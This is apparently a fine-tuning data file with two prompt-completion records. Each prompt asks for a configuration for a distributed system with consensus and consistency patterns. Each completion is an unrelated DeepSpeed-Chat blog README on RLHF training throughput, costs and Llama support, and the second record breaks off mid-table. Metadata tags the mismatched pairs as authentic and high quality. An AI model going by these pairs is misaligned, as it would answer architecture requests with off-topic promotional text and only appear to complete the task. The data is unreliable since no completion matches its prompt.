{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns for cloud infrastructure\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<div align=\"center\">\n\n# DeepSpeed Chat: Easy, Fast and Affordable RLHF Training of ChatGPT-like Models at All Scales\n\n</div>\n\n<div align=\"center\">\n\n<img src=\"../assets/images/hero-figure-black.png\" width=\"1000px\" alt=\"DeepSpeed-Chat!\"/>\n\n</div>\n\nTo cite DeepSpeed Chat, please cite our [arxiv report](https://arxiv.org/abs/2308.01320):\n\n```\n@article{yao2023dschat,\n  title={{DeepSpeed-Chat: Easy, Fast and Affordable RLHF Training of ChatGPT-like Models at All Scales}},\n  author={Zhewei Yao and Reza Yazdani Aminabadi and Olatunji Ruwase and Samyam Rajbhandari and Xiaoxia Wu and Ammar Ahmad Awan and Jeff Rasley and Minjia Zhang and Conglong Li and Connor Holmes and Zhongzhu Zhou and Michael Wyatt and Molly Smith and Lev Kurilenko and Heyang Qin and Masahiro Tanaka and Shuai Che and Shuaiwen Leon Song and Yuxiong He},\n  journal={arXiv preprint arXiv:2308.01320},\n  year={2023}\n}\n```\n\n# 1. Overview\n\nChatGPT-like models have taken the AI world by storm, and it would not be an overstatement to say that its impact on the digital world has been revolutionary. These models are incredibly versatile, capable of performing tasks like summarization, coding, and translation with results that are on-par or even exceeding the capabilities of human experts. Given the sheer power of these models, multiple efforts are underway in the AI open-source community to make ChatGPT-style models more accessible (e.g. ChatLLaMa, Alpaca, Vicuna, Databricks-Dolly, etc.).\n\nDespite these incredible efforts, there is still a lack of an end-to-end RLHF pipeline capable of training a powerful ChatGPT-like model that is easily accessible to the AI community. For instance, training a modest 6.7B ChatGPT model with existing systems typically requires an expensive multi-GPU setup that is beyond the reach of many data scientists. Even with access to such computing resources, training efficiency is often less than 5% of what these machines are capable of (as illustrated [shortly](#effective-throughput-and-scalability-analysis)). Finally, existing solutions simply cannot support easy, fast and affordable training state-of-the-art ChatGPT models with hundreds of billions of parameters, even given access to multi-GPU clusters.\n\nThese limitations stem from a lack of a robust system design that is capable of effectively supporting the complex InstructGPT’s RLHF training pipeline which is quite different from the standard pre-training and fine-tuning pipelines that existing DL systems are designed for. Therefore, in the spirit of democratizing ChatGPT-like models, and making RLHF training truly accessible to the AI community, today we are releasing DeepSpeed-Chat with the following three capabilities:\n\n(i) ***Easy-to-use Training and Inference Experience for ChatGPT Like Models***: A single script capable of taking a pre-trained Huggingface model, running it through all three steps of InstructGPT training using DeepSpeed-RLHF system and producing your very own ChatGPT like model. In addition, we provide an inference API for testing conversation-style interactions after the model is trained.\n\n(ii) ***DeepSpeed-RLHF Pipeline***: DeepSpeed-RLHF pipeline primarily replicates the training pipeline from the InstructGPT paper with careful attention to ensure completeness and one-to-one correspondence with the three-steps that includes a) Supervised Fine-tuning (SFT), b) Reward Model Fine-tuning and c) Reinforcement Learning with Human Feedback (RLHF). Additionally, we offer data abstraction and blending capabilities to enable training with multiple data sources.\n\n(iii) ***DeepSpeed-RLHF System***: A robust and sophisticated RLHF system that combines the training and inference prowess of DeepSpeed into a single unified Hybrid Engine (DeepSpeed-HE) for RLHF. The Hybrid-Engine is capable of seamlessly transitioning between inference and training modes within RLHF, allowing it to leverage various optimizations from DeepSpeed-Inference such as tensor-parallelism and high-performance transformer kernels for generation, while also benefiting from the multitude of ZeRO- and LoRA-based memory optimization strategies for RL training. DeepSpeed-HE is also aware of the full RLHF pipeline, allowing it to make optimal decisions in terms of memory management and data movement across different phases of RLHF.\n\n\nDeepSpeed-RLHF system is capable of unparalleled efficiency at scale, making complex RLHF training fast, affordable, and easily accessible to the AI community:\n\n***Efficiency and Affordability***: In terms of efficiency, [DeepSpeed-HE is over 15x faster than existing systems](#throughput-and-model-size-scalability-comparisons-with-existing-rlhf-systems), making RLHF training both fast and affordable. For instance, DeepSpeed-HE can train an OPT-13B in just 9 hours and OPT-30B in 18 hours on Azure Cloud for under $300 and $600, respectively.\n\n\n<div align=\"center\">\n\n| GPUs        | OPT-6.7B |  OPT-13B     |     OPT-30B     |     OPT-66B    |\n|-------------|:--------:|:--------------:|:-------------:|:-----------:|\n| 8x A100-40GB     | 5.7 hours | 10.8 hours |\t 1.85 days |\t NA |\n| 8x A100-80GB     | 4.1 hours ($132) | \t9 hours ($290) | \t18 hours ($580) | \t 2.1 days ($1620) |\n\n*Table 1. Single-Node 8x A100: Training Time and Corresponding Approximate Cost on Azure.*\n\n</div>\n\n\n***Excellent Scalability***: DeepSpeed-HE supports models with hundreds of billions of parameters and can achieve excellent scalability on multi-node multi-GPU systems. As a result, even a 13B model can be trained in 1.25 hours and a massive 175B model can be trained with DeepSpeed-HE in under a day.\n\n\n<div align=\"center\">\n\n| GPUs\t        | OPT-13B \t    | OPT-30B\t      | OPT-66B\t      | OPT-175B |\n|---------------|:-----------------:|:---------------:|:-------------:|:-------------:|\n| 64x A100-80G\t| 1.25 hours ($320)\t| 4 hours ($1024) | 7.5 hours ($1920)\t| 20 hours ($5120)|\n\n*Table 2. Multi-Node 64x A100-80GB: Training Time and Corresponding Approximate Cost on Azure.*\n</div>\n\n> ***Very Important Details***: The numbers in both tables above are for Step 3 of the training and are based on actual measured training throughput on DeepSpeed-RLHF curated dataset and training recipe which trains for one epoch on a total of 135M tokens. We have in total 67.5M query tokens (131.9k queries with sequence length 256) and 67.5M generated tokens (131.9k answers with sequence length 256), and a maximum global batch size per step of 0.5M tokens (1024 query-answer pairs). We urge readers to pay attention to these specifications before making any cost and e2e time comparisons with DeepSpeed-RLHF. See our [benchmark settings](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/applications/DeepSpeed-Chat/training/step3_rlhf_finetuning/BenckmarkSetting.md) page for more details.\n\n\n***Democratizing RLHF Training***: With just a single GPU, DeepSpeed-HE supports training models with over 13 billion parameters, enabling data scientists without access to multi-GPU systems to create not just toy RLHF models but large and powerful ones that can be used in real-world scenarios.\n\n<div align=\"center\">\n\n|            |\tV100 32G | \tA6000 48G | A100 40G | A100 80G  |\n|------------|:---------:|:----------:|:--------:|:---------:|\n| Model Size |\tOPT-2.7B | \tOPT-6.7B  | OPT-6.7B | OPT-13B |\n\nTable 3. Max Model Size Supported by DeepSpeed-HE on a Single GPU\n\n</div>\n\nNext, we dive deeper into the three capabilities of DeepSpeed-Chat introduced above.\n\n# 2. Easy-to-use ChatGPT Training and Inference Experience\n\nWe start with the easy-to-use experience by showing how you can train OPT-13B and then OPT-66B models with DeepSpeed-RLHF system. If you are short on time, you can even train an OPT-1.3B model on a single consumer-grade GPU in just two hours.  We also demonstrate how you can use our DeepSpeed-chat RLHF API to develop your own custom pipelines.\n\n## Training your first ChatGPT-Style model is so easy with DeepSpeed-Chat’s RLHF examples\n\n*a) One single script completes all three stages of RLHF training and generates your first ChatGPT model!*\n\nWe use an example of pretrained OPT-13B as the actor model and OPT-350M as the reward model in the following single script to generate a final 13B ChatGPT-style model:\n\n```python\npip install deepspeed>=0.9.0\n\ngit clone https://github.com/deepspeedai/DeepSpeedExamples.git\ncd DeepSpeedExamples/applications/DeepSpeed-Chat/\npip install -r requirements.txt\n\npython train.py --actor-model facebook/opt-13b --reward-model facebook/opt-350m --deployment-type single_node\n```\n\nIn about half a day, your 13B model would be fully trained with its checkpoints ready.  The following table demonstrates a breakdown of the training time for each of the three steps:\n\n<div align=\"center\">\n\n| Model Sizes                      | Step 1 | Step 2 | Step 3 | Total  |\n|--------------------------------- |:------:|:------:|:------:|:------:|\n| Actor: OPT-13B, Reward: OPT-350M | 2.5hr\t| 0.25hr | 10.8hr | 13.6hr |\n\nTable 4. E2E time breakdown for training a 13 billion parameter ChatGPT model via DeepSpeed-Chat on a single DGX node with 8 NVIDIA A100-40G GPUs.\n\n</div>\n\n*b) Test your final model with DeepSpeed-Chat’s Inference API*\n\nNow it is time to plug-in and test your final model trained by DeepSpeed-Chat! You can play with not only Q&A sessions but also conversation-style interactions.\n\n```\nHuman:        Do you know Microsoft?\nAssistant:    Yes, I’m a big fan of Microsoft.  What about them?\nHuman:        Can you explain it to a 6-year old child? I wonder how I should describe it\nAssistant:    Sure, I can try.  Microsoft is a company that makes computers, and they make a program called “Windows” which\n              is the operating system that runs on the computer. It’s like the “brain” of the computer.  It’s where all the\n              programs and files are stored. It’s also where you’ll find the “start” button, which is where you’ll start to\n              use the computer.\n```\n\n## Want to try different model sizes and configurations? You got it!\nWe understand users often like to play with different model sizes and configurations to meet their training time, resources, and quality requirements. With DeepSpeed-Chat, users can easily do that. For example, if you want to train a larger and higher-quality model on your GPU cluster for your research or business, you can simply use the same script with your desired model size e.g., 66B and GPU counts e.g., 64 GPUs:\n\n```python\npython train.py --actor-model facebook/opt-66b --reward-model facebook/opt-350m --deployment-type multi_node\n```\n\nWithin 9 hours, you can have your 66 billion parameters ChatGPT model ready to be served in your favorite front-end GUI:\n\n\n<div align=\"center\">\n\n| Model Sizes                       | Step 1  | Step 2 | Step 3 | Total  |\n|---------------------------------- |:-------:|:------:|:------:|:------:|\n| Actor: OPT-66B, Reward: OPT-350M | 82 mins | 5 mins | 7.5hr  | 9hr    |\n\nTable 5. E2E time breakdown for training a 66 billion parameter ChatGPT model via DeepSpeed-Chat on 8 DGX nodes with 8 NVIDIA A100-80G GPUs/node.\n\n</div>\n\nIf you only have around 1-2 hours for coffee or lunch break, you can also try to train a small/toy model with DeepSpeed-Chat. For example, we prepared a training example for a 1.3B model with a single dataset to test our framework on your consumer-grade GPUs. The best part is that you will have your model checkpoint ready to play with when you are back from your lunch break!\n\n```python\npython train.py --actor-model facebook/opt-1.3b --reward-model facebook/opt-350m --deployment-type single_gpu\n```\n\n<div align=\"center\">\n\n| Model Sizes                      | Step 1    | Step 2   | Step 3 | Total  |\n|--------------------------------- |:---------:|:--------:|:------:|:------:|\n| Actor: OPT-1.3B, Reward: OPT-350M | 2900 secs | 670 secs | 1.2hr | 2.2hr |\n\n*Table 6. E2E time breakdown for training a 1.3 billion parameter ChatGPT model via DeepSpeed-Chat on a single commodity NVIDIA A6000 GPU with 48GB memory.*\n\n</div>\n\n## Customizing your own RLHF training pipeline using DeepSpeed-Chat’s RLHF APIs\nDeepSpeed-Chat allows users to build their very own RLHF training pipeline using our flexible APIs shown below, which users can use to reconstruct their own RLHF training strategy. This enables a general interface and backend for creating a wide range of RLHF algorithms for research exploration.\n\n```python\n\nengine = DeepSpeedRLHFEngine(\n  actor_model_name_or_path=args.actor_model_name_or_path,\n  critic_model_name_or_path=args.critic_model_name_or_path,\n  tokenizer=tokenizer,\n  num_total_iters=num_total_iters,\n  args=args)\n\ntrainer = DeepSpeedPPOTrainer(engine=engine, args=args)\n\nfor prompt_batch in prompt_train_dataloader:\n  out = trainer.generate_experience(prompt_batch)\n  actor_loss, critic_loss = trainer.train_rlhf(out)\n```\n\n# 3. Full-fledged RLHF Training Pipeline\n\nTo provide a seamless training experience, we follow InstructGPT and include a full-fledged end-to-end training pipeline in DeepSpeed-Chat as shown in Figure 1.\n\n<div align=\"center\">\n\n<img src=\"../assets/images/ds-chat-overview.png\" width=\"800px\" alt=\"DeepSpeed-Chat!\"/>\n\n*Figure 1: The illustration of DeepSpeed-Chat’s RLHF training pipeline with optional features.*\n\n</div>\n\nOur pipeline includes three main steps:\n\n*\t**Step 1: Supervised finetuning (SFT)**, where human responses to various queries are carefully selected to finetune the pretrained language models.\n*\t**Step 2: Reward model finetuning**, where a separate (usually smaller than the SFT) model (RW) is trained with a dataset that has human-provided rankings of multiple answers to the same query.\n*\t**Step 3: RLHF training**, where the SFT model is further finetuned with the reward feedback from the RW model using the Proximal Policy Optimization (PPO) algorithm.\n\nWe provide two additional features in Step 3 to help improve model quality:\n\n*\t**Exponential Moving Average (EMA) collection**, where an EMA based checkpoint can be chosen for the final evaluation.\n*\t**Mixture Training**, which mixes the pretraining objective (i.e., the next word prediction) with the PPO objective to prevent regression performance on public benchmarks like SQuAD2.0.\n\nThe two training features, EMA and Mixed Training, are often omitted by other recent efforts since they can be optional. However, according to InstructGPT, EMA checkpoints generally provide better response quality than conventional final trained model and Mixture Training can help the model retain the pre-training benchmark solving ability. As such, we provide them for users to fully get the training experience as described in InstructGPT and strike for higher model quality.\n\nIn addition to being highly consistent with InstructGPT paper, we also provide convenient features to support researchers and practitioners in training their own RLHF model with multiple data resources:\n\n*\t***Data Abstraction and Blending Capabilities:*** DeepSpeed-Chat is able to train the model with multiple datasets for better model quality. It is equipped with (1) an abstract dataset layer to unify the format of different datasets; and (2) data splitting/blending capabilities so that the multiple datasets are properly blended and then split across the 3 training stages.\n\nTo illustrate the effectiveness of our training pipeline, we demonstrate the model quality with multi-round conversation as shown in the experience section.\n\n\n# 4. DeepSpeed Hybrid Engine – Unified Infrastructure to Power and Optimize RLHF Training\n\nStep 1 and Step 2 of the instruct-guided RLHF pipeline resemble regular fine-tuning of large models, and they are powered by ZeRO-based optimizations and a flexible combination of parallelism strategies in DeepSpeed training to achieve scale and speed.  Step 3 of the pipeline, on the other hand, is the most complex part to handle in terms of performance implications. Each iteration requires efficient processing of two phases a) inference phase for token/experience generation, producing inputs for the training and b) training phase to update the weights of actor and reward models, as well as the interaction and scheduling between them.  It introduces two major costs: (1) the memory cost, as several copies of the SFT and RW models need to be served throughout stage 3; and (2) the predominant generation phase, which if not accelerated properly, will significantly slow down the entire stage 3. Additionally, the two important features we added in Stage 3, including Exponential Moving Average (EMA) collection and Mixture Training, will incur additional memory and training costs.\n\nTo tackle these challenges, we composed the full system capability of DeepSpeed Training and Inference into a unified infrastructure that we call **Hybrid Engine**. It leverages the original DeepSpeed engines for fast training mode while effortlessly applying DeepSpeed inference engine for generation/evaluation mode, providing a significantly faster training system for RLHF training at Stage 3. As Figure 2 shows, the transition between DeepSpeed training and inference engine is seamless: by having the typical eval and train modes enabled for the actor model, when running for inference and training pipeline, DeepSpeed selects its different optimizations to run the model faster and improve the overall system throughput.\n\n\n<div align=\"center\">\n\n<img src=\"../assets/images/hybrid-engine.png\" width=\"600px\" alt=\"DeepSpeed-Chat!\"/>\n\n*Figure 2. DeepSpeed Hybrid Engine design for accelerating the most time-consuming portion of a RLHF pipeline.*\n\n</div>\n\nDuring its inference execution for the experience generation phase of RLHF training, DeepSpeed Hybrid Engine uses a light-weight memory management system to handle the KV-cache and intermediate results, together with highly optimized inference-adapted kernels and tensor parallelism implementation, to achieve a significant boost in throughput (tokens-per-second) compared to the existing solutions.\n\nDuring the training execution, Hybrid Engine enables memory optimization techniques such as DeepSpeed’s ZeRO family of technologies and Low Rank Adaption (LoRA).   We designed and implemented these system optimizations in a way that they are compatible with each other and can be composed together to deliver the highest training efficiency under the unified Hybrid Engine.\n\nHybrid Engine can seamlessly change model partitioning across training and inference to support tensor-parallelism based inferencing and ZeRO-based sharding mechanisms for training. It can also reconfigure the memory system to maximize memory availability during each of these modes. This allows for improved performance by avoiding memory allocation bottlenecks and supporting large batch sizes. Packed with a spectrum of system technologies from DeepSpeed training and inference, Hybrid Engine pushes the boundary of modern RLHF training and delivers unparalleled scale and system efficiency for RLHF workloads.\n\n\n# 5. DeepSpeed RLHF: Unparalleled Scale and Efficiency via Hybrid Engine\n\n## Capability Recap\n\nAs discussed, DeepSpeed-HE is an amalgamation of powerful system technologies for inference and training, architected to achieve excellent scale and efficiency for DeepSpeed-RLHF pipeline across a wide range of hardware, making RLHF training fast, affordable, and easily accessible to AI community.\n\nIn terms of efficiency and affordability, as shown in Table 1, DeepSpeed-HE can train OPT-13B in just 9 hours and OPT-30B in 18 hours on Azure Cloud for under $300 and $600, respectively. In terms of speed and scalability, as shown in Table 2, even a 13B model can be trained in 1.25 hours and a massive 175B model can be trained in under a day using a 64 GPU cluster. And in terms of accessibility and democratization of RLHF, DeepSpeed-HE supports training models with over 13 billion parameters on a single GPU as shown in Table 3.\n\n## Throughput and Model Size Scalability Comparisons with Existing RLHF Systems\n\nCompared to other RLHF systems like Colossal-AI or HuggingFace powered by native PyTorch, DeepSpeed-RLHF excels in system performance and model scalability:\n\n*\tWith respect to throughput, DeepSpeed enables over 10x improvement for RLHF training on a single GPU (Figure 3). On multi-GPU setup, it enables  6 – 19x  speedup over Colossal-AI and 1.4 – 10.5x over HuggingFace DDP (Figure 4).\n*\tWith respect to model scalability, Colossal-AI can run a max model size of 1.3B on a single GPU and 6.7B on a single A100 40G node, DeepSpeed-HE can run 6.5B and 50B models respectively on the same hardware, up to 7.5x larger.\n\nTherefore, with over an order of magnitude higher throughput, DeepSpeed-HE unlocks the ability to train significantly larger actor models under the same latency budget or train models of similar size at over 10x lower cost, compared to existing RLHF systems like Colossal-AI or HuggingFace DDP.\n\n<div align=\"center\">\n\n<img src=\"../assets/images/figure3.png\" width=\"600px\" />\n\n*Figure 3. Step 3 throughput comparison against two other system frameworks for accelerating RLHF \\\ntraining on a single NVIDIA A100-40G commodity GPU.  No icons represent OOM scenarios.*\n\n</div>\n\n<div align=\"center\">\n\n<img src=\"../assets/images/figure4.png\" width=\"600px\" />\n\n*Figure 4. End-to-end training throughput comparison for step 3 of the training pipeline (the most time \\\nconsuming portion) with different model sizes on a single DGX node equipped with 8 NVIDIA A100-40G GPUs.\\\nNo icons represent OOM scenarios.*\n\n</div>\n\nThis improvement in efficiency stems from DeepSpeed-HE’s ability to accelerate RLHF generation phase of the RLHF processing by leveraging DeepSpeed inference optimizations. Figure 5 shows the time breakdown for a 1.3B parameter model at an RLHF training iteration: majority of the time goes to the generation phase. By leveraging high performance inference kernels from DeepSpeed, DeepSpeed-HE can achieve up to 9x throughput improvement during this phase over HuggingFace and 15x over Colossal-AI allowing it to achieve unparalleled end-to-end efficiency.\n\n<div align=\"center\">\n\n<img src=\"../assets/images/figure5.png\" width=\"600px\" />\n\n*Figure 5. Superior generation phase acceleration from DeepSpeed Chat’s Hybrid Engine: A time/sequence breakdown for training OPT-1.3B actor model + OPT-350M reward model on a single DGX node with 8 A100-40G GPUs.*\n\n</div>\n\n## Effective Throughput and Scalability Analysis\n\n***(I) Effective Throughput Analysis.*** The effective throughput of DeepSpeed-HE during Stage 3 of the RLHF training depends on the throughput that it achieves during the generation and RL training phases. In our RLHF pipeline, the generation phase comprises approximately 20% of the total computation while the RL training phase comprises of remaining 80% (see [benchmark settings](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/applications/DeepSpeed-Chat/training/step3_rlhf_finetuning/BenckmarkSetting.md) page for details). However, despite having a small proportion, the former can take a large portion of the e2e time as it requires running the actor model once for each of the 256 generated tokens with an initial prompt of 256 tokens, making it memory bandwidth bound and difficult to achieve high throughput. In contrast, the RL training phase is compute bound running the reference actor model with just a couple of forward and backward passes with full 512 tokens from both prompt and generation per sample and can achieve good throughput.\n\n<div align=\"center\">\n\n<img src=\"../assets/images/Throughputs-OPT.png\" width=\"600px\" />\n\n*Figure 6. RLHF Generation, training, and effective throughput with DeepSpeed-HE for different model sizes, at the GPU count that maximizes efficiency.*\n\n</div>\n\nTo maximize the effective throughput, DeepSpeed-HE optimizes both phases. First, it uses the largest batch size possible to get higher efficiency in both phases. Second, during the generation phase, it leverages high-performance transformer kernels to maximize GPU memory bandwidth utilization when the model fits in single GPU memory, and leverages tensor-parallelism (TP) when it does not. Using TP in the generation phase instead of ZeRO to fit the model reduces the inter-GPU communication and maintains high GPU memory bandwidth utilization.\n\nFigure 6 shows the best achievable effective throughput for DeepSpeed-HE in terms of TFlops/GPU for model sizes ranging from 1.3B to 175B. It also shows the throughput achieved by each of the generation and training phases. DeepSpeed-HE is the most efficient for models in the range 6.7B-66B. Going beyond this range to 175B, the throughput drops due to the limited memory to support larger batch sizes, while still achieving 1.2x better efficiency than the small 1.3B model. The per-GPU throughput of these gigantic models could improve further when we scale them to more GPUs with more memory available for larger batch sizes.\n\nFurthermore, we would like to point out that our effective performance is 19x higher than existing systems, as shown in Figure 4, which suggests that they are operating at lower than 5% of the peak. This demonstrates the challenge of optimizing RLHF workloads as well as the effectiveness of our system despite the challenge.\n\n<div align=\"center\">\n\n<img src=\"../assets/images/figure7.png\" width=\"600px\" />\n\n*Figure 7. Scalability for training 13B (left) and 66B (right) actor model+350M reward model on an increasing number of DGX nodes with 8 A100-40/80G GPUs*\n\n</div>\n\n***(II) Scalability Analysis.*** The best effective throughput for different model sizes is achieved at different GPU count. This is in part because some of the larger model sizes require more memory to run. However, a large part of this behavior stems from DeepSpeed-HE’s scalability properties that we discuss next.\n\nFigure 7 shows that DeepSpeed-RLHF has achieved good scaling overall on up to 64 GPUs. However, if we look more closely, it shows that DeepSpeed-RLHF training achieves super-linear scaling at small scale, followed by near linear or sub-linear scaling at larger scales. This is due to the interaction between memory availability and max global batch size.\n\nAs DeepSpeed-HE is powered by ZeRO-based technology for training, it allows model states to be partitioned across the available GPUs. As a result, the memory consumption per GPU reduces with the increase in the number of GPUs, allowing DeepSpeed-HE to support a larger batch per GPU resulting in super-linear scaling. However, at large scale, while the available memory continues to increase, the maximum global batch size (1024, in our case, with a sequence length of 512) limits the batch size per GPU, resulting in near-linear or sub-linear scaling.\nAs a result, for a given max global batch size, DeepSpeed-HE achieves the best throughput and cost efficiency at the boundary of super-linear and sub-linear scalability, and the exact point is mostly determined by the largest batch size that can be run per GPU as the function of available memory and global batch size.\n\n# 6. Release: Try DeepSpeed Chat Today!\n\nWe are very excited to share that DeepSpeed-Chat is now open-sourced and available to the AI community.\n\n* To get started, please visit our github page for DeepSpeed-Chat: [GitHub Landing Page](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/applications/DeepSpeed-Chat)\n\n* We will continue to improve DeepSpeed-Chat with your feedback and support. Our [roadmap](https://github.com/deepspeedai/DeepSpeedExamples/tree/master/applications/DeepSpeed-Chat/README.md#-deepspeed-chats-roadmap-) shows currently supported features as well as ones that are planned for the future.\n\nDeepSpeed-Chat is part of the bigger DeepSpeed ecosystem comprising a multitude of Deep Learning systems and modeling technologies. To learn more,\n\n* Please visit our [website](https://www.deepspeed.ai/) for detailed blog posts, tutorials, and helpful documentation.\n* You can also follow us on our [English Twitter](https://twitter.com/DeepSpeedAI), [Japanese Twitter](https://twitter.com/DeepSpeedAI_JP), and [Chinese Zhihu](https://www.zhihu.com/people/deepspeed) for latest news on DeepSpeed.\n\nDeepSpeed welcomes your contributions! We encourage you to report issues, contribute PRs, and join discussions on the [DeepSpeed GitHub](https://github.com/deepspeedai/DeepSpeed/) page. Please see our [contributing guide](https://github.com/deepspeedai/DeepSpeed/blob/master/CONTRIBUTING.md) for more details. We are open to collaborations with universities, research labs, companies, such as those working together on deep learning research, applying DeepSpeed to empower real-world AI models and applications, and so on. For such requests (and other requests unsuitable for GitHub), please directly email to deepspeed-info@microsoft.com.\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": "blogs/deepspeed-chat/README.md", "language": "markdown", "complexity": "complex", "star_count": 39501, "quality_score": 0.89, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": false, "line_count": 333}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<div align=\"center\">\n\n# DeepSpeed-Chat: Llama/Llama-2 system support, efficiency boost, and training stability improvements\n\n</div>\n\n<div align=\"center\">\n  <img src=\"../assets/images/ds_chat_main.png\" alt=\"\" width=\"850\"/>\n</div>\n\n# Table of Contents\n1. [Introduction](#introduction)\n2. [System Support for Llama and Llama-2 models](#system-support-llama)\n3. [Improved Efficiency and Accessibility](#new-features)\n    - [3.3x Higher Throughput with MixZ++ for LoRA](#mixz)\n    - [ZeRO-Offload Support for Larger Models with 16x fewer GPUs](#zero-offload)\n4. [Stability Bug Fixes](#stability-bug-fixes)\n5. [Software Improvements](#software-improvements)\n    - [Characterization Scripts](#characterization-scripts)\n    - [Instrumentation](#instrumentation)\n    - [Testing](#testing)\n6. [Try Out DeepSpeed-Chat](#try-out-deepspeed-chat)\n\n\n# 1. Introduction <a name=\"introduction\"></a>\n\nDeepSpeed-Chat is a general system framework for RLHF training that enables easy, fast, affordable, and scalable training of ChatGPT-style models that we [publicly released on GitHub](https://github.com/deepspeedai/DeepSpeed/blob/master/blogs/deepspeed-chat/README.md). The detailed performance and capabilities of DeepSpeed-Chat have been published in our [blog post](https://github.com/deepspeedai/DeepSpeed/tree/master/blogs/deepspeed-chat) and [arXiv](https://arxiv.org/abs/2308.01320) paper.\n\nWe are happy to share that today we are improving DeepSpeed-Chat along three areas: i) system support for Llama/Llama-2 family of models, ii) system features for improved efficiency and accessibility, and iii) stability and software enhancements.\n\n- **System support for training Llama and Llama-2 models**\n\n  We ***introduce system support for training Llama and Llama-2 models*** in DeepSpeed-Chat enabling and leveraging various optimizations and features including the Hybrid Engine, ZeRO family of optimizations, Low-Rank Adaptation (LoRA) support, as well as full integration into the three-stage DeepSpeed-Chat RLHF pipeline. By leveraging the Hybrid-Engine, we speed up the experience generation phase for Llama-2-7B and Llama-2-13B models by **up to 7.1X**.\n\n-  **New System Features for Improved Efficiency and Accessibility**\n    - ***Mixed Precision ZeRO++ ([MixZ++](https://github.com/deepspeedai/DeepSpeed/pull/3954))***. It is an extended set of optimization strategies built upon [ZeRO++](https://www.deepspeed.ai/tutorials/zeropp/) tailored to reduce memory usage and improve training/inference efficiency for RLHF training with LoRA. MixZ++ partitions model parameters across GPUs to reduce footprint and gathers them with quantized communication only when needed similar to its ZeRO and ZeRO++ siblings. Our evaluation indicates MixZ++ increases the training throughput by **up to 3.3x** for the Llama-2-70B model running on 128 V100 GPUs.\n\n    - ***[ZeRO-Offload](https://www.microsoft.com/en-us/research/blog/zero-infinity-and-deepspeed-unlocking-unprecedented-model-scale-for-deep-learning-training/)***. It is an optimization that offloads optimizer memory and computation from the GPU to the host CPU, enabling larger models to be trained with fewer GPU resources. After training stability fixes and testing, we have enabled this feature across all three stages of the DeepSpeed-Chat RLHF training pipeline. ZeRO-Offload reduces the minimum number of GPUs required to train large models by **up to 16x**.\n\n- **Stability and Software Enhancements**\n\n  - DeepSpeed-Chat contains a rich set of features for training across many different platforms and scenarios. Composing these features in a systematic way and ensuring both system stability and decent training convergence is critical for the usability of the framework. Thus, in addition to new features in DeepSpeed-Chat, many system stability and training convergence issues have been fixed both in DeepSpeed-Chat (client code) and DeepSpeed (runtime). These improvements have been thoroughly tested using the OPT model family for end-to-end training. Furthermore, end-to-end testing, characterization scripts, and several instrumentation features like TensorBoard support are now also available. *To try out these latest features and software improvements, please use DeepSpeed release [v0.10.2](https://github.com/deepspeedai/DeepSpeed/tree/v0.10.2) and the latest DeepSpeed-Chat in [DeepSpeedExamples](https://github.com/deepspeedai/DeepSpeedExamples)*.\n\n  - Finally, to ensure the long-term health of the DeepSpeed-Chat training framework, [PyTests](https://github.com/deepspeedai/DeepSpeedExamples/blob/master/applications/DeepSpeed-Chat/training/tests/test_training.py) were added for testing Step 3 of the RLHF training pipeline and are run on a nightly basis through a newly developed [GitHub Actions workflow](https://github.com/deepspeedai/DeepSpeed/actions/workflows/nv-ds-chat.yml).\n\nWe now dive into the details of our new features, training stability, and software improvements.\n\n# 2. System Support for Llama and Llama-2 models <a name=\"system-support-llama\"></a>\n\nThe DeepSpeed-Chat training framework now provides system support for the Llama and Llama-2 models across all three stages of training. To support this, we encountered a spectrum of issues, spanning from minor runtime errors to intricate performance-related challenges. In particular, the Llama model architecture which deviates from the standard Transformers block, was incompatible with DeepSpeed's inference kernels and the DeepSpeed container policy used by the Hybrid Engine. Addressing these hurdles necessitated extensive modifications across our DeepSpeed-Chat pipeline and the DeepSpeed runtime including code to support the ZeRO family of optimizations and their interaction with optimized inference kernels in the Hybrid Engine. We have resolved these challenges to ensure that DeepSpeed-Chat can support Llama and Llama-2 and provide our users with the best possible experience. The details can be seen from several PRs that have been merged in our codebases.\n\n## Key Supported Optimizations\n\nThe following key optimizations in DeepSpeed are now fully integrated for Llama and Llama-2 models:\n\n- **DeepSpeed-Chat Integration**: Fully integrated into the complete, end-to-end three-stage DeepSpeed-Chat RLHF training framework, based on the OpenAI InstructGPT training strategy.\n- **Hybrid Engine**: DeepSpeed Hybrid Engine allows for superior generation phase [acceleration](https://github.com/deepspeedai/DeepSpeed/blob/master/blogs/deepspeed-chat/README.md#throughput-and-model-size-scalability-comparisons-with-existing-rlhf-systems), now supported for all Llama-1 model variants, Llama-2-7B, and Llama-2-13B models.\n- **ZeRO and ZeRO-Offload**: Fully supported by the [ZeRO](https://github.com/deepspeedai/DeepSpeed/blob/master/blogs/deepspeed-chat/README.md#throughput-and-model-size-scalability-comparisons-with-existing-rlhf-systems) family of optimizations including offload support leveraging full memory capacity of a system thus enabling training of even larger models.\n- **Mixed Precision ZeRO++ (MixZ++)**: Enhanced support for larger models like Llama-2-70B through the new MixZ++ feature, improving efficiency and reducing memory usage when there are frozen or non-trainable parameters.\n- **LoRA**: Fully supported by the [LoRA](https://github.com/deepspeedai/LoRA) feature, which vastly reduces the storage requirements for large language models by freezing original weights and learning pairs of rank-decomposition matrices.\n\n## Getting Started\n\nUsers looking to try the new Llama and Llama-2 model support can get started by using the newly added Llama scripts.\n| Step Number | Scripts |\n| --- | --- |\n| 1 | [Llama-2 Step 1 